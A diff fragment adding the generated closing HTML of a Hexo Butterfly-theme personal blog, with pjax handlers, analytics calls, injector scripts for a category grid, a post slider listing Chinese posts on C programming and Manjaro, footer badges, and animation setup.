+    const newScript = document.createElement('script')
+    const content = item.text || item.textContent || item.innerHTML || ""
+    Array.from(item.attributes).forEach(attr => newScript.setAttribute(attr.name, attr.value))
+    newScript.appendChild(document.createTextNode(content))
+    item.parentNode.replaceChild(newScript, item)
+  })
+
+  GLOBAL_CONFIG.islazyload && window.lazyLoadInstance.update()
+
+  typeof chatBtnFn === 'function' && chatBtnFn()
+  typeof panguInit === 'function' && panguInit()
+
+  // google analytics
+  typeof gtag === 'function' && gtag('config', '', {'page_path': window.location.pathname});
+
+  // baidu analytics
+  typeof _hmt === 'object' && _hmt.push(['_trackPageview',window.location.pathname]);
+
+  typeof loadMeting === 'function' && document.getElementsByClassName('aplayer').length && loadMeting()
+
+  // prismjs
+  typeof Prism === 'object' && Prism.highlightAll()
+})
+
+document.addEventListener('pjax:error', (e) => {
+  if (e.request.status === 404) {
+    pjax.loadUrl('/404.html')
+  }
+})</script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div><!-- hexo injector body_end start --> <script data-pjax>if(document.getElementById('recent-posts') && (location.pathname ==='/'|| '/' ==='all')){
+    var parent = document.getElementById('recent-posts');
+    var child = '<div class="recent-post-item" style="width:100%;height: auto"><div id="catalog_magnet"><div class="magnet_item"><a class="magnet_link" href="/categories/你好世界/"><div class="magnet_link_context" style=""><span style="font-weight:500;flex:1">📚 hexo 开山文章 (1)</span><span style="padding:0px 4px;border-radius: 8px;"><i class="fas fa-arrow-circle-right"></i></span></div></a></div><div class="magnet_item"><a class="magnet_link" href="/categories/butterfly/"><div class="magnet_link_context" style=""><span style="font-weight:500;flex:1">🦋 butterfly (1)</span><span style="padding:0px 4px;border-radius: 8px;"><i class="fas fa-arrow-circle-right"></i></span></div></a></div><div class="magnet_item"><a class="magnet_link" href="/categories/笔记/"><div class="magnet_link_context" style=""><span style="font-weight:500;flex:1">📒 记的一堆东西,话说笔记还会回来看吗? (7)</span><span style="padding:0px 4px;border-radius: 8px;"><i class="fas fa-arrow-circle-right"></i></span></div></a></div><div class="magnet_item"><a class="magnet_link" href="/categories/其他/"><div class="magnet_link_context" style=""><span style="font-weight:500;flex:1">🖼️ 杂七拉八 (1)</span><span style="padding:0px 4px;border-radius: 8px;"><i class="fas fa-arrow-circle-right"></i></span></div></a></div><a class="magnet_link_more"  href="https://atdunbg.xyz/categories" style="flex:1;text-align: center;margin-bottom: 10px;">查看更多...</a></div></div>';
+    console.log('已挂载magnet')
+    parent.insertAdjacentHTML("afterbegin",child)}
+     </script><style>#catalog_magnet{flex-wrap: wrap;display: flex;width:100%;justify-content:space-between;padding: 10px 10px 0 10px;align-content: flex-start;}.magnet_item{flex-basis: calc(50% - 5px);background: #f2f2f2;margin-bottom: 10px;border-radius: 8px;transition: all 0.2s ease-in-out;}.magnet_item:hover{background: #3ecdf1}.magnet_link_more{color:#555}.magnet_link{color:black}.magnet_link:hover{color:white}@media screen and (max-width: 600px) {.magnet_item {flex-basis: 100%;}}.magnet_link_context{display:flex;padding: 10px;font-size:16px;transition: all 0.2s ease-in-out;}.magnet_link_context:hover{padding: 10px 20px;}</style>
+    <style>undefined</style><script data-pjax>
+  function butterfly_swiper_injector_config(){
+    var parent_div_git = document.getElementById('recent-posts');
+    var item_html = '<div class="recent-post-item" style="height: auto;width: 100%"><div class="blog-slider swiper-container-fade swiper-container-horizontal" id="swiper_container"><div class="blog-slider__wrp swiper-wrapper" style="transition-duration: 0ms;"><div class="blog-slider__item swiper-slide" style="width: 750px; opacity: 1; transform: translate3d(0px, 0px, 0px); transition-duration: 0ms;"><a class="blog-slider__img" onclick="pjax.loadUrl(&quot;2022/11/13/hello-world/&quot;);" href="javascript:void(0);" alt=""><img width="48" height="48" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://i.loli.net/2020/05/01/gkihqEjXxJ5UZ1C.jpg" alt="" onerror="this.src=https://unpkg.zhimg.com/akilar-candyassets/image/loading.gif; this.onerror = null;"/></a><div class="blog-slider__content"><span class="blog-slider__code">2022-11-13</span><a class="blog-slider__title" onclick="pjax.loadUrl(&quot;2022/11/13/hello-world/&quot;);" href="javascript:void(0);" alt="">Hello World</a><div class="blog-slider__text">额,描述先空着,有时间再添加...</div><a class="blog-slider__button" onclick="pjax.loadUrl(&quot;2022/11/13/hello-world/&quot;);" href="javascript:void(0);" alt="">详情       </a></div></div><div class="blog-slider__item swiper-slide" style="width: 750px; opacity: 1; transform: translate3d(0px, 0px, 0px); transition-duration: 0ms;"><a class="blog-slider__img" onclick="pjax.loadUrl(&quot;2022/12/18/manjaroedit/&quot;);" href="javascript:void(0);" alt=""><img width="48" height="48" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://s1.vika.cn/space/2022/12/19/4dc36943bf674fbd87bfd5233eaa6065" alt="" onerror="this.src=https://unpkg.zhimg.com/akilar-candyassets/image/loading.gif; this.onerror = null;"/></a><div class="blog-slider__content"><span class="blog-slider__code">2022-12-18</span><a class="blog-slider__title" onclick="pjax.loadUrl(&quot;2022/12/18/manjaroedit/&quot;);" href="javascript:void(0);" alt="">Manjaro Linux 美化日记</a><div class="blog-slider__text">额,描述先空着,有时间再添加...</div><a class="blog-slider__button" onclick="pjax.loadUrl(&quot;2022/12/18/manjaroedit/&quot;);" href="javascript:void(0);" alt="">详情       </a></div></div><div class="blog-slider__item swiper-slide" style="width: 750px; opacity: 1; transform: translate3d(0px, 0px, 0px); transition-duration: 0ms;"><a class="blog-slider__img" onclick="pjax.loadUrl(&quot;2022/12/20/c_language_10/&quot;);" href="javascript:void(0);" alt=""><img width="48" height="48" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://i.loli.net/2020/05/01/gkihqEjXxJ5UZ1C.jpg" alt="" onerror="this.src=https://unpkg.zhimg.com/akilar-candyassets/image/loading.gif; this.onerror = null;"/></a><div class="blog-slider__content"><span class="blog-slider__code">2022-12-20</span><a class="blog-slider__title" onclick="pjax.loadUrl(&quot;2022/12/20/c_language_10/&quot;);" href="javascript:void(0);" alt="">C语言(第十章--对文件的输出)</a><div class="blog-slider__text">额,描述先空着,有时间再添加...</div><a class="blog-slider__button" onclick="pjax.loadUrl(&quot;2022/12/20/c_language_10/&quot;);" href="javascript:void(0);" alt="">详情       </a></div></div><div class="blog-slider__item swiper-slide" style="width: 750px; opacity: 1; transform: translate3d(0px, 0px, 0px); transition-duration: 0ms;"><a class="blog-slider__img" onclick="pjax.loadUrl(&quot;2022/12/01/c_language_8/&quot;);" href="javascript:void(0);" alt=""><img width="48" height="48" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://i.loli.net/2020/05/01/gkihqEjXxJ5UZ1C.jpg" alt="" onerror="this.src=https://unpkg.zhimg.com/akilar-candyassets/image/loading.gif; this.onerror = null;"/></a><div class="blog-slider__content"><span class="blog-slider__code">2022-12-01</span><a class="blog-slider__title" onclick="pjax.loadUrl(&quot;2022/12/01/c_language_8/&quot;);" href="javascript:void(0);" alt="">C语言(第八章-善于利用指针)</a><div class="blog-slider__text">额,描述先空着,有时间再添加...</div><a class="blog-slider__button" onclick="pjax.loadUrl(&quot;2022/12/01/c_language_8/&quot;);" href="javascript:void(0);" alt="">详情       </a></div></div><div class="blog-slider__item swiper-slide" style="width: 750px; opacity: 1; transform: translate3d(0px, 0px, 0px); transition-duration: 0ms;"><a class="blog-slider__img" onclick="pjax.loadUrl(&quot;2022/11/22/c_language_6/&quot;);" href="javascript:void(0);" alt=""><img width="48" height="48" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://i.loli.net/2020/05/01/gkihqEjXxJ5UZ1C.jpg" alt="" onerror="this.src=https://unpkg.zhimg.com/akilar-candyassets/image/loading.gif; this.onerror = null;"/></a><div class="blog-slider__content"><span class="blog-slider__code">2022-11-22</span><a class="blog-slider__title" onclick="pjax.loadUrl(&quot;2022/11/22/c_language_6/&quot;);" href="javascript:void(0);" alt="">C语言(第六章-利用数组批量处理数据)</a><div class="blog-slider__text">额,描述先空着,有时间再添加...</div><a class="blog-slider__button" onclick="pjax.loadUrl(&quot;2022/11/22/c_language_6/&quot;);" href="javascript:void(0);" alt="">详情       </a></div></div><div class="blog-slider__item swiper-slide" style="width: 750px; opacity: 1; transform: translate3d(0px, 0px, 0px); transition-duration: 0ms;"><a class="blog-slider__img" onclick="pjax.loadUrl(&quot;2023/02/21/minecraft_server/&quot;);" href="javascript:void(0);" alt=""><img width="48" height="48" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://s1.vika.cn/space/2023/02/23/a19ac63693b74305a61f556b5ad4df0f" alt="" onerror="this.src=https://unpkg.zhimg.com/akilar-candyassets/image/loading.gif; this.onerror = null;"/></a><div class="blog-slider__content"><span class="blog-slider__code">2023-02-21</span><a class="blog-slider__title" onclick="pjax.loadUrl(&quot;2023/02/21/minecraft_server/&quot;);" href="javascript:void(0);" alt="">Minecraft服务端，但是部署在手机上...</a><div class="blog-slider__text">额,描述先空着,有时间再添加...</div><a class="blog-slider__button" onclick="pjax.loadUrl(&quot;2023/02/21/minecraft_server/&quot;);" href="javascript:void(0);" alt="">详情       </a></div></div><div class="blog-slider__item swiper-slide" style="width: 750px; opacity: 1; transform: translate3d(0px, 0px, 0px); transition-duration: 0ms;"><a class="blog-slider__img" onclick="pjax.loadUrl(&quot;2023/02/01/c-language-1/&quot;);" href="javascript:void(0);" alt=""><img width="48" height="48" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://i.loli.net/2020/05/01/gkihqEjXxJ5UZ1C.jpg" alt="" onerror="this.src=https://unpkg.zhimg.com/akilar-candyassets/image/loading.gif; this.onerror = null;"/></a><div class="blog-slider__content"><span class="blog-slider__code">2023-02-01</span><a class="blog-slider__title" onclick="pjax.loadUrl(&quot;2023/02/01/c-language-1/&quot;);" href="javascript:void(0);" alt="">C语言(1~5章(补))</a><div class="blog-slider__text">额,描述先空着,有时间再添加...</div><a class="blog-slider__button" onclick="pjax.loadUrl(&quot;2023/02/01/c-language-1/&quot;);" href="javascript:void(0);" alt="">详情       </a></div></div></div><div class="blog-slider__pagination swiper-pagination-clickable swiper-pagination-bullets"></div></div></div>';
+    console.log('已挂载butterfly_swiper')
+    parent_div_git.insertAdjacentHTML("afterbegin",item_html)
+    }
+  var elist = 'undefined'.split(',');
+  var cpage = location.pathname;
+  var epage = '/';
+  var flag = 0;
+
+  for (var i=0;i<elist.length;i++){
+    if (cpage.includes(elist[i])){
+      flag++;
+    }
+  }
+
+  if ((epage ==='all')&&(flag == 0)){
+    butterfly_swiper_injector_config();
+  }
+  else if (epage === cpage){
+    butterfly_swiper_injector_config();
+  }
+  </script><script defer src="https://npm.elemecdn.com/hexo-butterfly-swiper/lib/swiper.min.js"></script><script defer data-pjax src="https://npm.elemecdn.com/hexo-butterfly-swiper/lib/swiper_init.js"></script><script data-pjax>
+  function butterfly_footer_beautify_injector_config(){
+    var parent_div_git = document.getElementById('footer-wrap');
+    var item_html = '<div id="workboard"></div><p id="ghbdages"><a class="github-badge" target="_blank" href="https://hexo.io/" style="margin-inline:5px" data-title="博客框架为Hexo_v6.2.0" title=""><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://img.shields.io/badge/Frame-Hexo-blue?style=flat&amp;logo=hexo" alt=""/></a><a class="github-badge" target="_blank" href="https://butterfly.js.org/" style="margin-inline:5px" data-title="主题版本Butterfly_v4.3.1" title=""><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://img.shields.io/badge/Theme-Butterfly-6513df?style=flat&amp;logo=bitdefender" alt=""/></a><a class="github-badge" target="_blank" href="https://vercel.com/" style="margin-inline:5px" data-title="本站采用多线部署，主线路托管于Vercel" title=""><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://img.shields.io/badge/Hosted-Vercel-brightgreen?style=flat&amp;logo=Vercel" alt=""/></a><a class="github-badge" target="_blank" href="https://dashboard.4everland.org/" style="margin-inline:5px" data-title="本站采用多线部署，备用线路托管于4EVERLAND" title=""><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://img.shields.io/badge/Hosted-4EVERLAND-22DDDD?style=flat&amp;logo=IPFS" alt=""/></a><a class="github-badge" target="_blank" href="https://github.com/" style="margin-inline:5px" data-title="本站项目由Github托管" title=""><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://img.shields.io/badge/Source-Github-d021d6?style=flat&amp;logo=GitHub" alt=""/></a><a class="github-badge" target="_blank" href="http://creativecommons.org/licenses/by-nc-sa/4.0/" style="margin-inline:5px" data-title="本站采用知识共享署名-非商业性使用-相同方式共享4.0国际许可协议进行许可" title=""><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://img.shields.io/badge/Copyright-BY--NC--SA%204.0-d42328?style=flat&amp;logo=Claris" alt=""/></a></p>';
+    console.log('已挂载butterfly_footer_beautify')
+    parent_div_git.insertAdjacentHTML("beforeend",item_html)
+    }
+  var elist = 'null'.split(',');
+  var cpage = location.pathname;
+  var epage = 'all';
+  var flag = 0;
+
+  for (var i=0;i<elist.length;i++){
+    if (cpage.includes(elist[i])){
+      flag++;
+    }
+  }
+
+  if ((epage ==='all')&&(flag == 0)){
+    butterfly_footer_beautify_injector_config();
+  }
+  else if (epage === cpage){
+    butterfly_footer_beautify_injector_config();
+  }
+  </script><script async src="/js/runtime.js"></script><div class="js-pjax"><script async="async">var arr = document.getElementsByClassName('recent-post-item');
+for(var i = 0;i<arr.length;i++){
+    arr[i].classList.add('wow');
+    arr[i].classList.add('animate__backInUp');
+    arr[i].setAttribute('data-wow-duration', '0.67s');
+    arr[i].setAttribute('data-wow-delay', '0s');
+    arr[i].setAttribute('data-wow-offset', '100');
+    arr[i].setAttribute('data-wow-iteration', '1');
+  }</script><script async="async">var arr = document.getElementsByClassName('card-widget');
+for(var i = 0;i<arr.length;i++){
+    arr[i].classList.add('wow');
+    arr[i].classList.add('animate__slideInUp');
+    arr[i].setAttribute('data-wow-duration', '');
+    arr[i].setAttribute('data-wow-delay', '');
+    arr[i].setAttribute('data-wow-offset', '');
+    arr[i].setAttribute('data-wow-iteration', '');
+  }</script></div><script defer src="https://npm.elemecdn.com/hexo-butterfly-wowjs/lib/wow.min.js"></script><script defer src="https://npm.elemecdn.com/hexo-butterfly-wowjs/lib/wow_init.js"></script><script async src="//at.alicdn.com/t/font_2032782_8d5kxvn09md.js"></script><!-- hexo injector body_end end --></body></html>
